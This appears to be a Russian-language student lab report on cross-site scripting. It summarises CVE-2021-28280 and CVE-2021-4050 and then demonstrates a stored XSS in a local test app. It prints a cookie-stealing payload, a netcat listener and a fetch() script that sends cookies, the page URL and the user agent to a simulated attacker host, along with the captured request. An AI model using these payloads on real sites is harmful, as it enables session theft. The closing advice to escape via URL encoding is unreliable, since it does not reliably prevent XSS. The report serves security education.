# Часть 1

### 1) CVE-2021-28280

В CMS PHPFusion 9.03.110, написанной на php, была найдена уязвимость CSRF + XSS, которая позволяет злоумышленникам выполнять произвольные веб-скрипты.

1) Атакующий создаёт вредоносную HTML-страницу с формой

2) В неё вставляется payload:

```
'><script>alert(document.cookie)</script>
```

3) Жертва открывает страницу 

4) Браузер автоматически отправляет POST-запрос в:

```
/search.php
```

5) Сервер:

- принимает параметр без фильтрации
- возвращает его в ответе

6) В браузере выполняется JavaScript
7) Злоумышленник получает куки пользователя

Источник: https://anotepad.com/notes/2skndayt

### 2) CVE-2021-4050

В LiveHelperChat, php-приложение для тех поддержки пользователей, была найдена уязвимость Stored XSS, позволяющая выполнять произвольный JS код.

1) Злоумышленник загружает файл формата **.**svg

2) Внутри SVG внедряется JavaScript-код

3) При открытии файла браузер рендерит SVG и выполняет скрипт

Источник: https://huntr.com/bounties/27eb39d7-7636-4c4b-922c-a2f8fbe1ba05

Сайт [CVEDB](https://cvedb.github.io) сообщает о 20 149 CVE за 2021 год. [Stackwatch](https://www.stack.watch/stats/2021/) приводит цифру в 21 115.

# Часть 2

Попробуем базовый скрипт \<script>alert(1)\</script>
Работает - получаем уведомление "1", но это просто выводит уведомление.
Покажем, что XSS атака может принести настоящий вред:

Откроем порт на localhost:
$ nc -l -p 6767
Это будет симулировать компьютер злоумышленника

И используем скрипт, который отправит злоумышленнику наши данные

\<script>
  fetch('http://localhost:6767', {
    method: 'POST',
    body: JSON.stringify({
      cookie: document.cookie,
      url: window.location.href,
      userAgent: navigator.userAgent
    })
  });
\</script>



На открытом порту получаем данные:
$ nc -l -p 6767
POST / HTTP/1.1
Host: localhost:6767
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:150.0) Gecko/20100101 Firefox/150.0
Accept: */*
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br, zstd
Referer: http://localhost:8080/
Content-Type: text/plain;charset=UTF-8
Content-Length: 152
Origin: http://localhost:8080
Connection: keep-alive
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
Priority: u=4

{"cookie":"",
"url":"http://localhost:8080/XSS-1/index.php",
"userAgent":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:150.0) Gecko/20100101 Firefox/150.0"}



Итого: уязвимость stored XSS (потому что комментарий сохраняется и скрипт срабатывает каждый раз когда заходишь в комментарии). Меры по защите:
- запретить следующие символы: < > " ' & / `
- использовать экранирование через url encoding